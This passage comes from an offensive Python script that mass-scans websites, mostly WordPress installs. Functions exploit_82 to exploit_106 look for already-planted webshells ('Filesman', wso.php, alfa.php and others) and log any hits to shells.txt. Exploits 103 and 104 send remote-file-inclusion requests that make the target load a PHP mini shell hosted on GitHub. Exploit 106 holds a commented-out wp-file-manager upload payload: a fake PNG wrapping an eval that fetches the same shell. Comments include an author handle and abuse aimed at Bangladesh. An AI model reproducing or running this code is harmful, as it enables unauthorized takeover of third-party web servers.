        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_82(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/backups-dup-lite/dup-installer/main.installer.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 82 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/backups-dup-lite/dup-installer/main.installer.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/backups-dup-lite/dup-installer/main.installer.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 82 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/backups-dup-lite/dup-installer/main.installer.php\n')
            else:
                print ('[#] Exploit 82 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#82 exploit already done
#fuck you Bangladesh 
#fuck you Bangladesh system 
#call me h0rn3t sp1d3rs 

def exploit_83(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/606.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 83 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/606.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/606.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 83 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/606.php\n')
            else:
                print ('[#] Exploit 83 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_84(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 84 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 84 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/404.php\n')
            else:
                print ('[#] Exploit 84 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#call me h0rn3t sp1d3rs 
#complete 

def exploit_85(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/bp.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 85 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/cgi-bin/bp.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/bp.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 85 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/cgi-bin/bp.php\n')
            else:
                print ('[#] Exploit 85 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#

def exploit_86(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/cgi-bin/403.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 86 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/cgi-bin/403.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cgi-bin/403.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 86 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/cgi-bin/403.php\n')
            else:
                print ('[#] Exploit 86 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_87(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/403.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 87 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/403.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/403.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 87 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/403.php\n')
            else:
                print ('[#] Exploit 87 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_88(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wordpress/241.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 88 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wordpress/241.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wordpress/241.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 88 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wordpress/241.php\n')
            else:
                print ('[#] Exploit 88 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_89(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/pridmag/24.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 89 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/24.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/pridmag/24.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 89 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/24.php\n')
            else:
                print ('[#] Exploit 89 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_90(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/241.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 90 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/241.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/241.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 90 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/241.php\n')
            else:
                print ('[#] Exploit 90 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_91(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/24.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 91 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/24.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/24.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 91 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/24.php\n')
            else:
                print ('[#] Exploit 91 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_92(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/241.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 92 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/241.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/241.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 92 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/241.php\n')
            else:
                print ('[#] Exploit 92 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_93(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/406',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 93 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/406\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/406',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 93 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/406\n')
            else:
                print ('[#] Exploit 93 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_94(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 94 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/1.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 94 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/1.php\n')
            else:
                print ('[#] Exploit 94 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_95(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/x.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 95 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/x.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/x.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 95 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/x.php\n')
            else:
                print ('[#] Exploit 95 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_96(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/c.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 96 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/c.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/c.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 96 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/c.php\n')
            else:
                print ('[#] Exploit 96 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_97(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/z.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 97 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/z.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/z.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 97 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/z.php\n')
            else:
                print ('[#] Exploit 97 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_98(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/bp.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 98 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/bp.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/bp.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 98 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/bp.php\n')
            else:
                print ('[#] Exploit 98 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_99(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/alfa.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 99 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/alfa.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/alfa.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 99 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/alfa.php\n')
            else:
                print ('[#] Exploit 99 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_100(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 100 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wso.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 100 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wso.php\n')
            else:
                print ('[#] Exploit 100 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_101(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 101 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 101 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/404.php\n')
            else:
                print ('[#] Exploit 101 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_102(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/mu-plugins/s.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 102 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/mu-plugins/s.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/mu-plugins/s.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 102 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/mu-plugins/s.php\n')
            else:
                print ('[#] Exploit 102 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
def exploit_103(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
        if ('mini shell by h0rn3t sp1d3rs ' in check.content.decode("utf-8")):
                print (' [#] Exploit 103 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8"):
                    print (' [#] Exploit 103 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
            else:
                print ('[#] Exploit 103 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_104(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
        if ('mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8")):
                print (' [#] Exploit 104 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'mini shell by h0rn3t sp1d3rs ' in check.content.decode("utf-8"):
                    print (' [#] Exploit 104 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
            else:
                print ('[#] Exploit 104 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_105(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/beauty-premium/includes/shell.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 105 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/themes/beauty-premium/includes/shell.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/beauty-premium/includes/shell.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 105 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/beauty-premium/includes/shell.php\n')
            else:
                print ('[#] Exploit 105 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_106(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        # data = """--------------------------66e3ca93281c7050\\Content-Disposition: form-data; name=\cmd\\\\\upload\\--------------------------66e3ca93281c7050\\Content-Disposition: form-data; name=\target\\\\\l1_Lw\\--------------------------66e3ca93281c7050\\Content-Disposition: form-data; name=\upload[]\; filename=\spamtools.be.php\\\Content-Type: image/png\\\\\89PNG\\\1a\\00\00\00\IHDR\00\00\01^\00\00\01^\04\03\00\00\00?\05j)\00\00\00\1ePLTE\ff\ff\ff\ef\ef\ef\e5\e5\e5\ce\ce\ce\a1\a1\a1iiiVVVGGG333\00\00\00g\00\cc\e2\00\00\\c0IDATx\da\ed]K[\db\c8\12m\c9\ce^\c6\90\bb58\\dc\9dm\9c\\d9\d9X\1e\c2\8e\87I\c22\!\93\e5@xmc\02\f1\da\0f\a9\ff\ed]`\eb\ddVU\c9C\b5\e6\a2-\d4\a7\f2Q\e9\a8\1fuN\8b\df\b9\ba\ee\84\bc\^\d7\83\c7\8f\bc\9a\08\a7\b1F\bb\aa\97\f4\c8:5\f2^L,A\bb\8cSr\e4\055\d2\bc\17\0eC\be\e4H\f3NL*\8f\8f\d2i\be\f05Y\f05\ffM\f5[*\95J\b9\c1\b7\dc\b4\8f\de\9f\1e\f5\ec\86\95\83\fa\adv\ff\92\d3\cb\fd\ba]\d1\86\1f\92Q2\eck\19\b8\dc\93FB\a4>\f5[\de\91\91k\d2\d1\18\df\eaG\19\bb\dcCK\d7\fa-\97\12\90\b0.\fcP>\9629a-\f9\d7\dc\95\8a\cb\dd\d6\11\df\1d\a9\bc&5\fd\ea\f7\e5@\9d\af\bc\ad\e8\c6\0f\85c9\ef:\d0\8c\8d\9d\b9\e9J\a7\a6\17\be\cb\83\f9\f9\ca[\ad\ea\d7\d8MIW\ba-\9d\f8\e1\85L\bdn-}\f87\1d^)eK\1f|\97\01\e9\fa\15\cc_\bf\10x\a5[\d3\85\1f\\03H\be\f2\\17\fe}\03JW\8e+z\e0k\1c\c3\f2\95m=\ea\b7\08LW\8e\f4\e0\87-h\be\d3{1\f3\af\-\07)\f7t\c0\17\\0eR\f6u\a8\dfux\be\0f\8b\b7\bc\fc\00\fa\16\87\be\c9\bc\fc\0b\fcX<\\9f\f8\f1E\94\ef\94\d1x\eb\f7\&\df\b1\c5\ce\0f\98\f2\95\b2\c6\cd\bf\c6wT\be\fb\dc\f8\16P\e9\ca\9f\dc\f5\bb\8c\cbw\c4\cd\0f\1b\b8|\c7\163\ff\be\c5\e5\eb\d6x\f15p\f4 e\8b\b7~\91\f4 e\9b\97\1f\cc\012\df\bfy\f9\17IgR\f6y\f1]\c6\e6;\e4\ad\dfg\d8|G\16+?\ac`\f3\1d\f3\f2\ef::_^|\b7\b0\f9:\16k\fd\be\c5\e6\ebV\b2\f0Yf|\f1\f9\d6X\f1\c5~\8e\a5\cc\19\be2o\f8\d6\84q\c9\87/%_\f3k\8e\f8![=<>\be\cc\fc@\e13\ce\ef\1b\e5{\c1\89\ef\066\df\/\ffR\c6;\9c\f8\aeP\c6\bf\8c\f8\e2\c7\eb\bc\f3\8b\z>\c4\8b\ef#\cf73\e3\8b\9e\cf\12\ac\f8\1a\c7\c8|\99\d7w\04a=\8a\13_\f4z_\85\19\dfW\f8\f5T\ce\f1/e\bd\9as\fc\8b%\b43\c1\8c/\92 \f6\d8\f7\e7\f1\fbY\bc\fbo\af\b0\af\1b\f3\fe&j\041\14\ec\fb\c7\e6\\\df\03\c1\df\1f\b5\8b,_\ee\fe(D\01?tt1\f7\97<f?\ccB\fa\a3\8e1\83\1d\\faS\d7\11sc\1d\f0-\e2\ca\81\bd\bf\0f\bc'\db\8eF\f2\e0+\fe\c0\f5{\b2\f7\a7\16`\9f\8c\cfB\13|\c5;\d0\cePM\e8Q\bfB\14\07\f0\b7M\0b}\00\e0\8ds\eb\de/\e5\d7\b7,\a7\03|+4\c2\d7H\ad`\b7\b6\88|\17\a6\1fJ\ad\e0sK\11\c9\82o*\07\8f\03z'-\f4\b1)z\b2mu$\0f\be\f3_\b9\1f\d6\9cH\16|\85x\9d\fe%\d6\86\1f\84\10\c2Tr\c4\a4\1d\fe\a5\9a\e8\bb\0b\ef@\f2X}\fc\\ca\1f\93\d3]\9c^z\c1\fa\f9$\84\9d\8e\05\88d\c1W\88\a5n\94%~m\c7#5\f2\d70\9a\a1\9apz\15h$\0b\beB\88B\f3\c3\0c\e3\bb^\03\13\c9\81\af\10B\946\edn\f7\a8kw\d6p\bf\94\07\dfi\ceB\fd\d7\bc\f9\1b\e5\cd'o\feFF\de\f0\fd\f2\e7rVK\b4k\e9\b4B\8d\bc\a4\de\b3p/\dc\afG\b4\eb\fd\e0\e8\f1#'B\deS\bd\f4\e45\d5\bf\cf\a5\de\f3\da\11\0e\d9K\ef\94\1c\f9m\8d\1ay\97\b3\f7\ed>\83\1f\de\d3\f7\ed\e9\fb\f6\f4}\8b\fcimssss\cd\caE\fd\1ae\fb\fd\f5@J\f7\fe\c8n\e8?\fe-\07\ad\f4\eez\ab\da\e0\9b<\bfhF\16/~u,\8d\f15^\0f\e26o\15m\eb\d7\f83ie(\b6\18\a0\0b?$\a7+e\cf\d2\92\\e5Rl\c4\aaP\13|\d5\d6t\ee\be\86\f5[\9c\b3\9d\eb\d4\b5\e3\07s\eef\e3\a8\a2\1b\ff\be\9e\bf\b3t\a8\19\bei\9b\fbA/H\1d\ea\f7\1d|#W\07~H\df\da\0f:\ff\f1\f3/\a0u\e2V#|!\9d\13>\c0\fc\f5\fbN\a2:=\b8\f9\01\d6\f9\e3\f5\\b0\f3/\b0\f7\f2\b3&\f8B\9b\c9\c7\96\1e\f5\0b\ee\0cl\e9<?php @eval(\?>\.file_get_contents(\https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\));?>\\--------------------------66e3ca93281c7050--\\"""
        #
        # ck = requests.post(url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers,data=data, allow_redirects=True,timeout=15)
        check = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/php/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 106 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-file-manager/lib/php/h0rn3t.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            #
